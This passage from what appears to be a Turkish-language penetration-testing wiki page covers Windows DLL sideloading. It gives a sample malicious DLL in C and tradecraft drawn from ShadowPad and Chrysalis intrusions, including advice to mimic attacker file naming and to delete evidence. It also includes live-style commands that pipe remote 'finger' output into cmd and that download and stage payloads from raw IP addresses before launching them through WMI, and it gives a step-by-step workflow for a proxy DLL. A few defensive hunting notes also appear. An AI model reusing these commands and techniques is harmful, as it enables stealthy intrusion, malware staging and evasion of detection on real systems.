- Minimal bir DLL payload oluştur:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için, bir proxying framework (ör. DLLirant/Spartacus) kullanarak payload’unuzu da çalıştıran bir forwarding DLL üretin.

- Bu teknik, DLL adının host binary tarafından çözülmesine dayanır. Host absolute paths veya safe loading flags (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export set seçimi sırasında dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon’ın ShadowPad’i meşru yazılımlarla karışacak şekilde, ana payload’u diskte encrypted halde tutan **üç dosyalı bir triad** ile deploy ettiğini açıkladı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor’lar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers executable’ı Windows binary’si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerliliğini korur.
2. **Malicious loader DLL** – beklenen bir adla EXE’nin yanına bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuscate edilmiş bir MFC binary’sidir; tek görevi encrypted blob’u bulmak, decrypt etmek ve ShadowPad’i reflectively map etmektir.
3. **Encrypted payload blob** – çoğu zaman aynı dizinde `<name>.tmp` olarak saklanır. Decrypted payload memory-mapping sonrası loader TMP dosyasını silerek forensic evidence’ı yok eder.

Tradecraft notları:

* Signed EXE’yi yeniden adlandırmak (PE header içindeki orijinal `OriginalFileName` korunurken) onun Windows binary’si gibi görünmesini sağlar ama vendor signature’ı da korur; bu yüzden Ink Dragon’ın `conhost.exe` gibi görünen ama gerçekte AMD/NVIDIA utility’leri olan binary’ler bırakma alışkanlığını taklit edin.
* Executable trusted kaldığı için, allowlisting kontrollerinin çoğunda yalnızca malicious DLL’nin onun yanında bulunması yeterlidir. Loader DLL’yi özelleştirmeye odaklanın; signed parent genellikle dokunulmadan çalışabilir.
* ShadowPad’in decryptor’ü, TMP blob’un loader’ın yanında ve writable olmasını bekler; böylece mapping sonrası dosyayı zero’layabilir. Payload yüklenene kadar dizini writable tutun; memory’ye alındıktan sonra OPSEC için TMP dosyası güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading’i LOLBAS ile eşleştirir; böylece diskteki tek custom artifact, trusted EXE’nin yanındaki malicious DLL olur:

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` başlatır, komutları bir Finger server’dan çeker ve `cmd`’ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 text çeker; `| cmd` server yanıtını çalıştırır ve operators’a ikinci aşama server-side değiştirme imkanı verir.

- **Built-in download/extract:** Benign bir extension ile bir archive indir, aç ve sideload hedefini plus DLL’yi rastgele bir `%LocalAppData%` klasörü altında stage et:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress’i gizler ve redirects’i takip eder; `tar -xf` Windows’un built-in tar’ını kullanır.

- **WMI/CIM launch:** EXE’yi WMI üzerinden başlatın; böylece telemetry bir CIM-created process gösterirken colocated DLL yüklenir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL’leri tercih eden binary’lerle çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos) trusted isim altında çalışır.

- **Hunting:** `forfiles` için `/p`, `/m` ve `/c` birlikte göründüğünde alert üretin; admin script’leri dışında nadirdir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion, DLL sideload plus tamamen memory içinde payload’lar stage eden bir NSIS-packed dropper teslim etmek için trusted bir update chain’i kötüye kullandı.

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` ve encrypted blob `BluetoothService` bırakır, ardından EXE’yi başlatır.
- Host EXE `log.dll` import eder ve `LogInit`/`LogWrite` çağırır. `LogInit` blob’u mmap-load eder; `LogWrite` onu **0x19660D** / **0x3C6EF35F** sabitleri ve önceki bir hash’ten türetilen key material ile custom LCG-based stream kullanarak decrypt eder, buffer’ı plaintext shellcode ile overwrite eder, temp’leri free eder ve ona atlar.
- Bir IAT’den kaçınmak için loader, export isimlerini **FNV-1a basis 0x811C9DC5 + prime 0x1000193** ile hash’leyerek API’leri çözer, ardından Murmur-style avalanche (**0x85EBCA6B**) uygular ve salted target hash’lerle karşılaştırır.

Main shellcode (Chrysalis)
- `gQ2JR&9;` key’i ile beş pass boyunca add/XOR/sub tekrar ederek PE-benzeri ana module’ü decrypt eder, ardından import resolution’ı tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- Runtime’da her karakter için bit-rotate/XOR transform’ları ile DLL name string’lerini yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- **PEB → InMemoryOrderModuleList** üzerinden yürüyen, her export table’ı 4-byte bloklar halinde Murmur-style mixing ile parse eden ikinci bir resolver kullanır ve hash bulunmazsa yalnızca `GetProcAddress`’e geri döner.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` dosyasının içinde **offset 0x30808** konumunda (size **0x980**) bulunur ve `qwhvb^435h&*7` key’i ile RC4-decrypt edilir; C2 URL’si ve User-Agent açığa çıkar.
- Beacon’lar nokta ile ayrılmış bir host profile oluşturur, başına `4Q` tag’ini ekler, ardından `HttpSendRequestA` üzerinden HTTPS ile göndermeden önce `vAuig34%^325hGV` key’iyle RC4-encrypt eder. Responses RC4-decrypt edilir ve bir tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode CLI args ile kontrol edilir: args yoksa `-i`’ye işaret eden persistence (service/Run key) install edilir; `-i` kendini `-k` ile yeniden başlatır; `-k` install’u atlar ve payload’u çalıştırır.

Alternate loader observed
- Aynı intrusion, Tiny C Compiler bıraktı ve `C:\ProgramData\USOShared\` içinden `libtcc.dll` yanında `svchost.exe -nostdlib -run conf.c` çalıştırdı. Saldırganın sağladığı C source shellcode’u gömülü halde içeriyordu, compile edildi ve disk üzerinde bir PE’ye dokunmadan in-memory çalıştı. Şununla çoğaltın:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC tabanlı compile-and-run aşaması, çalışma zamanında `Wininet.dll` import etti ve sabit kodlanmış bir URL’den ikinci aşama shellcode çekti; böylece derleme çalıştırması gibi davranan esnek bir loader elde edildi.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, meşru host’un yüklenen kötü amaçlı DLL’den sonra çökmeden daha sonraki aşamaları düzgün yükleyebilmesi için **stability engineering** ekler.

Gözlemlenen desen
- Beklenen bağımlılık adıyla, örneğin `version.dll`, kötü amaçlı bir DLL’in yanına güvenilir bir EXE bırak.
- Kötü amaçlı DLL, beklenen tüm export’ları gerçek sistem DLL’ine geri **proxy** eder (örneğin `%SystemRoot%\\System32\\version.dll`), böylece import çözümleme yine başarıyla tamamlanır ve host process çalışmaya devam eder.
- Yüklemeden sonra, kötü amaçlı DLL **host entry point’ini patch’ler**; böylece ana thread, process’i sonlandıracak veya kod çalıştıracak yolları izlemek yerine sonsuz bir `Sleep` döngüsüne düşer.
- Yeni bir thread gerçek kötü amaçlı işi yapar: bir sonraki aşama DLL adını veya path’ini decrypt etmek (RC4/XOR yaygındır), ardından bunu `LoadLibrary` ile çalıştırmak.

Neden önemli
- Normal DLL proxying API uyumluluğunu korur, ancak host’un sonraki aşamalar için yeterince uzun süre canlı kalacağını garanti etmez.
- Ana thread’i `Sleep(INFINITE)` içinde park etmek, loader decryption, staging veya network bootstrap işlemlerini worker thread içinde yaparken signed process’i resident tutmanın basit bir yoludur.
- Sadece şüpheli bir `DllMain` aramak bu deseni kaçırabilir; çünkü ilginç davranış host entry point patch’lendiğinde ve ikincil thread başladığında gerçekleşir.

Minimal workflow
1. Signed host EXE’yi kopyala ve yerel dizinden hangi DLL’i resolve ettiğini belirle.
2. Aynı fonksiyonları export eden ve bunları meşru DLL’e forward eden bir proxy DLL oluştur.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluştur.
4. Bu thread’den host entry point’i veya ana thread başlatma rutinini patch’leyerek `Sleep` üzerinde döngüye girmesini sağla.
5. Bir sonraki aşama DLL adını/config’ini decrypt et ve `LoadLibrary` çağır veya payload’ı manual-map et.

Defensive pivots
- Kendi application directory’sinden `System32` yerine `version.dll` veya benzeri yaygın library’leri yükleyen signed process’ler.
- Image load’dan kısa süre sonra process entry point’inde yapılan memory patch’leri; özellikle `Sleep`/`SleepEx`’e yönlendirilmiş jump/call’lar.
- Proxy DLL tarafından oluşturulan ve hemen decrypted bir adla ikinci bir DLL üzerinde `LoadLibrary` çağıran thread’ler.
- `ProgramData`, `%TEMP%` veya unpack edilmiş archive path’leri gibi writable staging directory’lerinde vendor executable’larının yanına yerleştirilmiş tam export proxy DLL’leri.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
